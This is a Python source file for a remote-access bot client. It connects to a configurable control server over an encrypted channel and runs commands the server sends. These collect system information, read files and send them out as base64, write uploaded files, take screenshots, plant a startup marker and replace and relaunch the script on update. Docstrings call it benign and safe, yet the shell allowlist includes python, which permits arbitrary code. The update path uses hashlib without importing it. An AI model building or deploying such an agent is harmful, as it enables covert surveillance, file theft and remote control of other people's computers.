#!/usr/bin/env python3
"""Benign local agent client for a secure command-relay lab."""

from __future__ import annotations

import base64
import json
import os
import platform
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path
from typing import Any, Dict, List, Optional

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms

try:
    from PIL import ImageGrab
except Exception:  # pragma: no cover
    ImageGrab = None

KEY = os.environ.get("C2_KEY", "0123456789abcdef0123456789abcdef").encode("utf-8")
if len(KEY) != 32:
    raise ValueError("C2_KEY must be exactly 32 bytes long")

HOST = os.environ.get("C2_HOST", "127.0.0.1")
PORT = int(os.environ.get("C2_PORT", "5555"))
BOT_ID = os.environ.get("BOT_ID", f"bot-{platform.node()}-{os.getpid()}")
HEARTBEAT_INTERVAL = 15
MAX_TRANSFER_BYTES = 8 * 1024 * 1024


class SingleInstanceGuard:
    """Prevent multiple copies from running concurrently."""

    def __init__(self, name: str) -> None:
        self.lock_path = Path(tempfile.gettempdir()) / f"{name}.lock"
        self.handle = open(self.lock_path, "w+", encoding="utf-8")

    def acquire(self) -> bool:
        try:
            import fcntl

            fcntl.flock(self.handle.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
            return True
        except Exception:
            return False


def encrypt_payload(message: Dict[str, Any]) -> bytes:
    """Encrypt a JSON object with ChaCha20 and prefix a length field."""
    payload = json.dumps(message, separators=(",", ":"), sort_keys=True).encode("utf-8")
    nonce = os.urandom(16)
    cipher = Cipher(algorithms.ChaCha20(KEY, nonce), mode=None)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(payload) + encryptor.finalize()
    encrypted = nonce + ciphertext
    return struct.pack(">I", len(encrypted)) + encrypted


def decrypt_payload(packet: bytes) -> Dict[str, Any]:
    """Decrypt a message from the encrypted transport and parse JSON."""
    if len(packet) < 4:
        raise ValueError("Packet is too short")
    body_len = struct.unpack(">I", packet[:4])[0]
    body = packet[4:4 + body_len]
    if len(body) < 16:
        raise ValueError("Encrypted body is incomplete")
    nonce = body[:16]
    ciphertext = body[16:]
    cipher = Cipher(algorithms.ChaCha20(KEY, nonce), mode=None)
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    return json.loads(plaintext.decode("utf-8"))


def recv_exact(sock: socket.socket, size: int) -> bytes:
    """Read exactly size bytes from a socket."""
    chunks = bytearray()
    while len(chunks) < size:
        chunk = sock.recv(size - len(chunks))
        if not chunk:
            raise ConnectionError("Socket closed while reading")
        chunks.extend(chunk)
    return bytes(chunks)


def send_packet(sock: socket.socket, message: Dict[str, Any]) -> None:
    """Send one encrypted message to the server."""
    sock.sendall(encrypt_payload(message))


def get_system_info() -> Dict[str, Any]:
    """Return a compact snapshot of local system information."""
    return {
        "bot_id": BOT_ID,
        "hostname": platform.node(),
        "os": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "arch": platform.machine(),
        "user": os.environ.get("USER") or os.environ.get("USERNAME") or "unknown",
        "cwd": os.getcwd(),
        "pid": os.getpid(),
        "python": platform.python_version(),
    }


def safe_shell(command: str) -> Dict[str, Any]:
    """Execute only a small allowlist of harmless shell commands."""
    allowed = {"echo", "whoami", "pwd", "ls", "uname", "hostname", "date", "python", "python3"}
    if not command or not command.strip():
        return {"status": "error", "error": "empty command"}
    parts = command.strip().split()
    if not parts:
        return {"status": "error", "error": "empty command"}
    if parts[0] not in allowed:
        return {"status": "error", "error": "command not allowed"}
    try:
        completed = subprocess.run(parts, capture_output=True, text=True, timeout=10)
        return {
            "status": "ok",
            "returncode": completed.returncode,
            "stdout": completed.stdout,
            "stderr": completed.stderr,
        }
    except Exception as exc:  # pragma: no cover
        return {"status": "error", "error": str(exc)}


def safe_ls(path: str) -> List[str]:
    """List directory entries without descending into subdirectories."""
    try:
        target = path or os.getcwd()
        return sorted(os.listdir(target))
    except OSError as exc:
        return [f"error:{exc}"]


def safe_download(path: str) -> Dict[str, Any]:
    """Read a file and send it as base64 with size limits."""
    full_path = path or os.getcwd()
    if not os.path.exists(full_path):
        return {"status": "error", "error": "not found"}
    if os.path.isdir(full_path):
        return {"status": "error", "error": "directory"}
    size = os.path.getsize(full_path)
    if size > MAX_TRANSFER_BYTES:
        return {"status": "error", "error": f"file too large: {size} bytes"}
    with open(full_path, "rb") as fh:
        data = fh.read()
    return {"status": "ok", "path": full_path, "size": size, "b64": base64.b64encode(data).decode("ascii")}


def safe_upload(path: str, encoded: str) -> Dict[str, Any]:
    """Write a file from base64 content."""
    try:
        decoded = base64.b64decode(encoded)
    except Exception as exc:  # pragma: no cover
        return {"status": "error", "error": str(exc)}
    if len(decoded) > MAX_TRANSFER_BYTES:
        return {"status": "error", "error": "payload exceeds max bytes"}
    destination = Path(path)
    destination.parent.mkdir(parents=True, exist_ok=True)
    destination.write_bytes(decoded)
    return {"status": "ok", "path": str(destination), "bytes": len(decoded)}


def take_screenshot() -> Dict[str, Any]:
    """Capture a screenshot to a temp file and return a PNG base64 payload."""
    if ImageGrab is None:
        return {"status": "error", "error": "Pillow not installed"}
    try:
        image = ImageGrab.grab()
        tmp = Path(tempfile.gettempdir()) / "secure_lab_screenshot.png"
        image.save(tmp)
        with open(tmp, "rb") as fh:
            png = fh.read()
        return {"status": "ok", "path": str(tmp), "b64": base64.b64encode(png).decode("ascii")}
    except Exception as exc:  # pragma: no cover
        return {"status": "error", "error": str(exc)}


def create_safe_persistence_marker() -> Dict[str, Any]:
    """Create a harmless startup marker file instead of a hostile persistence chain."""
    app_data = Path(os.environ.get("APPDATA") or Path.home() / ".config")
    target = app_data / "secure_lab_startup.txt"
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("secure lab agent marker\n", encoding="utf-8")
    return {"status": "ok", "path": str(target)}


COMMANDS: Dict[str, Any] = {
    "info": lambda args: get_system_info(),
    "echo": lambda args: args.get("text", ""),
    "whoami": lambda args: os.environ.get("USER") or os.environ.get("USERNAME") or "unknown",
    "pwd": lambda args: os.getcwd(),
    "ls": lambda args: safe_ls(args.get("path", os.getcwd())),
    "cd": lambda args: (os.chdir(args.get("path", os.getcwd())) or os.getcwd()),
    "download": lambda args: safe_download(args.get("path", "")),
    "upload": lambda args: safe_upload(args.get("path", ""), args.get("b64", "")),
    "sleep": lambda args: (time.sleep(float(args.get("seconds", 0))) or {"status": "ok", "seconds": float(args.get("seconds", 0))}),
    "ping": lambda args: {"status": "ok", "message": "pong"},
    "shell": lambda args: safe_shell(args.get("cmd", "")),
    "screenshot": lambda args: take_screenshot(),
    "persist": lambda args: create_safe_persistence_marker(),
}


class AgentClient:
    """Encrypted network client with reconnect logic and a command loop."""

    def __init__(self) -> None:
        self.sock: Optional[socket.socket] = None
        self.connected = False
        self.reconnect_delay = 2
        self.stop_event = threading.Event()
        self.guard = SingleInstanceGuard("secure_lab_agent")
        self.running = self.guard.acquire()

    def connect(self) -> None:
        """Connect and retry with exponential backoff."""
        while not self.stop_event.is_set():
            try:
                self.sock = socket.create_connection((HOST, PORT), timeout=10)
                self.connected = True
                self.reconnect_delay = 2
                self.handshake()
                self.command_loop()
                break
            except OSError:
                time.sleep(self.reconnect_delay)
                self.reconnect_delay = min(self.reconnect_delay * 2, 60)

    def handshake(self) -> None:
        """Send the initial hello packet to the server."""
        assert self.sock is not None
        send_packet(self.sock, {"type": "hello", "bot_id": BOT_ID, "info": get_system_info()})

    def send_heartbeat(self) -> None:
        """Send a heartbeat to keep the bot visible to the server."""
        assert self.sock is not None
        send_packet(self.sock, {"type": "heartbeat", "bot_id": BOT_ID, "ts": time.time()})

    def command_loop(self) -> None:
        """Read and execute commands while the socket remains open."""
        assert self.sock is not None
        while not self.stop_event.is_set():
            try:
                header = recv_exact(self.sock, 4)
                if not header:
                    break
                body_len = struct.unpack(">I", header)[0]
                payload = recv_exact(self.sock, body_len)
                message = decrypt_payload(header + payload)
                message_type = message.get("type")
                if message_type == "welcome":
                    self.connected = True
                elif message_type == "command":
                    self.handle_command(message)
                elif message_type == "update":
                    self.handle_update(message)
                elif message_type == "pong":
                    continue
                else:
                    continue
            except (ConnectionError, OSError, ValueError, json.JSONDecodeError):
                self.connected = False
                break

    def handle_command(self, message: Dict[str, Any]) -> None:
        """Execute a server-issued command and return the result."""
        job_id = message.get("job_id")
        cmd = message.get("cmd")
        args = message.get("args", {}) or {}
        handler = COMMANDS.get(cmd)
        payload = {"type": "job_result", "job_id": job_id, "status": "ok", "result": {"status": "error", "error": "unknown command"}, "ts": time.time()}
        if handler is not None:
            try:
                payload["result"] = handler(args)
            except Exception as exc:  # pragma: no cover
                payload["status"] = "error"
                payload["result"] = {"status": "error", "error": str(exc)}
        else:
            payload["status"] = "error"
        assert self.sock is not None
        send_packet(self.sock, payload)

    def handle_update(self, message: Dict[str, Any]) -> None:
        """Validate and stage an update payload before swapping in place."""
        version = message.get("version", "unknown")
        sha256 = message.get("sha256")
        encoded = message.get("b64")
        if not encoded:
            self._ack_update("rejected")
            return
        data = base64.b64decode(encoded)
        if hashlib.sha256(data).hexdigest() != sha256:
            self._ack_update("rejected")
            return
        tmp_path = Path(tempfile.gettempdir()) / "secure_lab_update.py"
        tmp_path.write_bytes(data)
        self._ack_update("received")
        target = Path(__file__).resolve()
        backup = target.with_suffix(target.suffix + ".bak")
        if target.exists():
            shutil.copy2(target, backup)
        shutil.copy2(tmp_path, target)
        subprocess.Popen([sys.executable, str(target)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        os._exit(0)

    def _ack_update(self, status: str) -> None:
        """Report the status of an update receipt to the server."""
        if self.sock is None:
            return
        send_packet(self.sock, {"type": "update_ack", "bot_id": BOT_ID, "status": status, "ts": time.time()})

    def heartbeat_loop(self) -> None:
        """Periodically emit heartbeats while the client is connected."""
        while not self.stop_event.is_set():
            if self.connected and self.sock is not None:
                self.send_heartbeat()
            time.sleep(HEARTBEAT_INTERVAL)


def main() -> None:
    """Launch the secure local agent and keep it connected to the control server."""
    client = AgentClient()
    if not client.running:
        print("another instance is already running")
        return
    heartbeat_thread = threading.Thread(target=client.heartbeat_loop, daemon=True)
    heartbeat_thread.start()
    client.connect()


if __name__ == "__main__":
    main()
